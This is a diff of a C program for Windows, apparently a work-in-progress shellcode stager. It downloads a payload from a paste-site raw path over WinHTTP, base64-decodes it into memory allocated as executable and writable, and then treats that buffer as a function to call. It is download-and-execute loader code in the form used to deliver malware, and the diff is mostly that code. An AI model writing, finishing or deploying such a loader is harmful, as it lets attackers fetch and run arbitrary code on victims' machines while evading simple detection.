@@ -20,6 +20,8 @@
 #include <stdlib.h>
 #include <windows.h>
 #include <winhttp.h>
+#include <wincrypt.h>
+//#include <cdecode.h>
 
 /* set up winhttp */
 HINTERNET winhttp_init() {
@@ -48,10 +50,9 @@ void punt(HINTERNET internet, char * error) {
 }
 
 int main(int argc, char * argv[]) {
-  ULONG32 size;
-  char * buffer;
+  BYTE * buffer;
   void (*function)();
-  BOOL bResults = FALSE;
+  DWORD size;
   HINTERNET hSession = NULL,
             hRequest = NULL,
             hConnect = NULL;
@@ -75,7 +76,7 @@ int main(int argc, char * argv[]) {
                           INTERNET_DEFAULT_HTTP_PORT, 0);
 
   /* send HTTP GET to target host */
-  LPCWSTR path = L"/raw.php?i=swEkxybE";
+  LPCWSTR path = L"/raw.php?i=XprAV403";
 
   // if (hConnect)
   hRequest = WinHttpOpenRequest(hConnect,
@@ -102,43 +103,91 @@ int main(int argc, char * argv[]) {
     punt(hSession, "could not send HTTP request\n");
   }
 
-  /* search for start code in returned text */
-  bResults = WinHttpReceiveResponse(hRequest, NULL);
-
-  if (bResults) {
-    WinHttpQueryDataAvailable(hRequest, &dwSize);
-    pszOutBuffer = malloc(dwSize+1);
-
-    ZeroMemory(pszOutBuffer, dwSize+1);
-
-    WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
-                    dwSize, &dwDownloaded);
-    // request handle, buffer to write to, number of bytes to read,
-    // number of bytes actually read
-
-    printf("%s", pszOutBuffer);
-
-    free(pszOutBuffer);
+  /* receive response from server */
+  if (!WinHttpReceiveResponse(hRequest, NULL)) {
+    punt(hSession, "no response received\n");
   }
 
-  printf("\nwe're here!\n");
+  WinHttpQueryDataAvailable(hRequest, &dwSize);
+  pszOutBuffer = malloc(dwSize+1);
+
+  ZeroMemory(pszOutBuffer, dwSize+1);
+
+  WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
+                  dwSize, &dwDownloaded);
+  // request handle, buffer to write to, number of bytes to read,
+  // number of bytes actually read
+
+  printf("%s\n", pszOutBuffer);
+
   if (hRequest) WinHttpCloseHandle(hRequest);
   if (hConnect) WinHttpCloseHandle(hConnect);
   if (hSession) WinHttpCloseHandle(hSession);
 
-  exit(0);
+  /* search for start code in returned text */
+
+  // for now, assume it's the first 4 characters
+  // TODO add an actual substring search for the start sequence
 
   /* read length immediately after start code */
-  size = 0;
+  /*size = atoi(pszOutBuffer);
+  printf("The length of the message is: %lu\n", size);
 
-  /* read <length> characters, perhaps b64 decode? then treat as code */
+  // find the b64-encoded code block, separated from the length specifier by
+  // a space
+
+  char *b64code = strchr(pszOutBuffer, L" ");
+  if(!b64code) {
+    // improperly formatted payload
+    printf("no space found\n");
+  }
+
+  printf("%s\n", b64code);*/
+
+  // (index of the space in the payload) + 1 to get start index of b64
+  /*DWORD b64index = (b64code - pszOutBuffer) + 1;
+
+  printf("b64 data starts at index %lu\n", b64index);*/
+
+  // TEST ENCODING TO SEE WHAT COMES OUT
+  /*
+  BYTE * toEncode = "This is a message.";
+  LPSTR encoded[500];
+
+  BOOL yay = CryptBinaryToString(toEncode, 28, CRYPT_STRING_BASE64, encoded, NULL);
+
+  if (!yay) {
+    printf("URGH\n");
+    printf("Official error: %lu\n", GetLastError());
+  }
+  printf("%s\n", encoded);
+  */
+
+  BOOL win = CryptStringToBinary(pszOutBuffer, 0, CRYPT_STRING_BASE64 | CRYPT_STRING_STRICT,
+                                 NULL, &size, NULL, NULL);
 
   /* allocate a RWX buffer */
   buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-  if (buffer == NULL)
+  if (buffer == NULL) {
     punt(hSession, "could not allocate buffer\n");
+  }
 
-  /* toss our newly found code into the buffer */
+  /* read <size> characters, b64 decode, then treat as code, and
+   * toss our newly found shellcode into the buffer */
+  //base64_decodestate *b64state;
+  //base64_decode_block(b64code, size, buffer, b64state);
+
+  win = CryptStringToBinary(pszOutBuffer, 0, CRYPT_STRING_BASE64 | CRYPT_STRING_STRICT,
+                                 buffer, &size, NULL, NULL);
+
+  if(!win) {
+    printf("FAIL.\n");
+    printf("Official error: %lu\n", GetLastError());
+  }
+  printf("b64 string was: %s\n", buffer);
+
+  free(pszOutBuffer);
+  exit(0);
 
   /* cast our buffer as a function and call it */
   function = (void (*)())buffer;
